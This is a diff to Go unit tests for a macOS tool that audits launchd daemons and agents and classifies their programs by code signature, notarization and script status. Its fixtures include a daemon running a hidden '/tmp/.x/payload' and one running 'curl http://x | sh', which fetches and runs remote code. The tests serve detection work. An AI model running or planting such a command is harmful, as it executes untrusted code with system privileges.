@@ -21,6 +21,15 @@ Authority=Apple Code Signing Certification Authority
 Authority=Apple Root CA
 TeamIdentifier=not set`
 
+// macOS 26 names the leaf of Apple's platform chain "macOS Software Signing".
+const tahoeAppleCodesign = `Executable=/bin/launchctl
+Identifier=com.apple.xpc.launchctl
+Format=Mach-O universal (x86_64 arm64e)
+Authority=macOS Software Signing
+Authority=Apple Code Signing Certification Authority
+Authority=Apple Root CA
+TeamIdentifier=not set`
+
 const devIDCodesign = `Executable=/Library/Foo/foo
 Identifier=com.foo.agent
 CodeDirectory v=20500 size=900 flags=0x10000(runtime) hashes=20+2 location=embedded
@@ -44,6 +53,7 @@ func TestParseCodesign(t *testing.T) {
 		team  string
 	}{
 		{"apple platform", appleCodesign, 0, "apple", "-"},
+		{"apple platform, macOS 26 leaf name", tahoeAppleCodesign, 0, "apple", "-"},
 		{"developer id", devIDCodesign, 0, "developer-id", "ABCDE12345"},
 		{"adhoc", adhocCodesign, 0, "adhoc", "-"},
 		{"unsigned", "/tmp/y: code object is not signed at all", 1, "unsigned", "-"},
@@ -58,22 +68,6 @@ func TestParseCodesign(t *testing.T) {
 	}
 	if s := parseCodesign(devIDCodesign, 0).Signer; !strings.HasPrefix(s, "Developer ID Application: Foo Inc") {
 		t.Errorf("signer = %q", s)
-	}
-}
-
-func TestParseSpctl(t *testing.T) {
-	cases := map[string]string{
-		"/x: accepted\nsource=Notarized Developer ID\norigin=Developer ID Application: Foo (ABC)": "notarized",
-		"/x: accepted\nsource=Developer ID":        "developer-id",
-		"/x: accepted\nsource=Apple System":        "apple",
-		"/x: accepted\nsource=Mac App Store":       "app-store",
-		"/x: rejected\nsource=no usable signature": "rejected",
-		"weird": "unknown",
-	}
-	for in, want := range cases {
-		if got := parseSpctl(in); got != want {
-			t.Errorf("parseSpctl(%q) = %s; want %s", in, got, want)
-		}
 	}
 }
 
@@ -116,11 +110,12 @@ func TestScriptArg(t *testing.T) {
 
 // fakeSystem builds deps backed by in-memory plists and signing results.
 type fakeSystem struct {
-	dirs   map[string][]string  // dir -> file names
-	plists map[string]string    // plist path -> JSON
-	sign   map[string][2]string // target -> codesign output, spctl output
-	exists map[string]bool
-	calls  map[string]int
+	dirs    map[string][]string  // dir -> file names
+	plists  map[string]string    // plist path -> JSON
+	sign    map[string][2]string // target -> codesign output, spctl output
+	exists  map[string]bool
+	scripts map[string]bool // files that start with a shebang
+	calls   map[string]int
 }
 
 func (f *fakeSystem) deps(home string) deps {
@@ -133,6 +128,12 @@ func (f *fakeSystem) deps(home string) deps {
 			return nil, os.ErrNotExist
 		},
 		exists: func(p string) bool { return f.exists[p] },
+		readHead: func(p string, n int) ([]byte, error) {
+			if f.scripts[p] {
+				return []byte("#!"), nil
+			}
+			return []byte{0xcf, 0xfa}, nil
+		},
 		exec: func(ctx context.Context, argv ...string) (string, string, int, error) {
 			switch argv[0] {
 			case "/usr/bin/plutil":
@@ -144,15 +145,18 @@ func (f *fakeSystem) deps(home string) deps {
 				return j, "", 0, nil
 			case "/usr/bin/codesign":
 				t := argv[len(argv)-1]
+				if argv[1] == "--verify" { // notarization requirement check
+					if f.sign[t][1] == "notarized" {
+						return "", "", 0, nil
+					}
+					return "", t + ": does not satisfy its designated Requirement", 3, nil
+				}
 				f.calls[t]++
 				out := f.sign[t][0]
 				if strings.Contains(out, "not signed at all") {
 					return "", out, 1, nil
 				}
 				return "", out, 0, nil
-			case "/usr/sbin/spctl":
-				t := argv[len(argv)-1]
-				return "", f.sign[t][1], 3, nil
 			}
 			return "", "", 0, errors.New("unexpected command " + argv[0])
 		},
@@ -163,7 +167,7 @@ func TestLaunchdTargets(t *testing.T) {
 	f := &fakeSystem{
 		calls: map[string]int{},
 		dirs: map[string][]string{
-			"/Library/LaunchDaemons":         {"com.good.plist", "com.evil.plist", "com.gone.plist", "readme.txt", "com.script.plist"},
+			"/Library/LaunchDaemons":         {"com.good.plist", "com.evil.plist", "com.gone.plist", "readme.txt", "com.script.plist", "com.shebang.plist", "com.apple2.plist"},
 			"/Library/LaunchAgents":          {"com.good2.plist"},
 			"/Users/me/Library/LaunchAgents": {"com.adhoc.plist"},
 		},
@@ -172,14 +176,18 @@ func TestLaunchdTargets(t *testing.T) {
 			"/Library/LaunchDaemons/com.evil.plist":          `{"Label":"com.evil","Program":"/tmp/.x/payload","RunAtLoad":true}`,
 			"/Library/LaunchDaemons/com.gone.plist":          `{"Label":"com.gone","ProgramArguments":["/opt/removed/app"]}`,
 			"/Library/LaunchDaemons/com.script.plist":        `{"Label":"com.script","ProgramArguments":["/bin/sh","-c","curl http://x | sh"],"KeepAlive":{"SuccessfulExit":false}}`,
+			"/Library/LaunchDaemons/com.shebang.plist":       `{"Label":"com.shebang","Program":"/usr/local/bin/run.sh","RunAtLoad":true}`,
+			"/Library/LaunchDaemons/com.apple2.plist":        `{"Label":"com.apple2","ProgramArguments":["/bin/launchctl","load"]}`,
 			"/Library/LaunchAgents/com.good2.plist":          `{"Label":"com.good2","ProgramArguments":["/Library/Foo/foo"]}`,
 			"/Users/me/Library/LaunchAgents/com.adhoc.plist": `{"Label":"com.adhoc","ProgramArguments":["/Users/me/bin/tool"]}`,
 		},
-		exists: map[string]bool{"/bin/sh": true, "/Library/Foo/foo": true, "/tmp/.x/payload": true, "/Users/me/bin/tool": true},
+		scripts: map[string]bool{"/usr/local/bin/run.sh": true},
+		exists:  map[string]bool{"/usr/local/bin/run.sh": true, "/bin/launchctl": true, "/bin/sh": true, "/Library/Foo/foo": true, "/tmp/.x/payload": true, "/Users/me/bin/tool": true},
 		sign: map[string][2]string{
-			"/Library/Foo/foo":   {devIDCodesign, "/x: accepted\nsource=Notarized Developer ID"},
-			"/tmp/.x/payload":    {"/tmp/.x/payload: code object is not signed at all", "/x: rejected\nsource=no usable signature"},
-			"/Users/me/bin/tool": {adhocCodesign, "/x: rejected"},
+			"/Library/Foo/foo":   {devIDCodesign, "notarized"},
+			"/tmp/.x/payload":    {"/tmp/.x/payload: code object is not signed at all", ""},
+			"/Users/me/bin/tool": {adhocCodesign, ""},
+			"/bin/launchctl":     {tahoeAppleCodesign, ""},
 		},
 	}
 	out, err := launchdTargets(context.Background(), f.deps("/Users/me"))
@@ -198,8 +206,8 @@ func TestLaunchdTargets(t *testing.T) {
 		}
 		byLabel[c[1]] = c
 	}
-	if len(byLabel) != 6 {
-		t.Fatalf("want 6 items (readme.txt ignored), got %d: %v", len(byLabel), byLabel)
+	if len(byLabel) != 8 {
+		t.Fatalf("want 8 items (readme.txt ignored), got %d: %v", len(byLabel), byLabel)
 	}
 	col := func(label string, i int) string { return byLabel[label][i] }
 	// columns: kind label plist target state team signer notarization flags
@@ -217,6 +225,12 @@ func TestLaunchdTargets(t *testing.T) {
 	}
 	if col("com.adhoc", 0) != "user-agent" || col("com.adhoc", 4) != "adhoc" {
 		t.Errorf("adhoc item: %v", byLabel["com.adhoc"])
+	}
+	if col("com.shebang", 4) != "script" || !strings.Contains(col("com.shebang", 8), "shebang") {
+		t.Errorf("a script run directly must be a script, not an unsigned program: %v", byLabel["com.shebang"])
+	}
+	if col("com.apple2", 4) != "apple" || col("com.apple2", 7) != "apple" {
+		t.Errorf("Apple platform tools must be recognised: %v", byLabel["com.apple2"])
 	}
 	if f.calls["/Library/Foo/foo"] != 1 {
 		t.Errorf("a program shared by two items must be inspected once, got %d", f.calls["/Library/Foo/foo"])
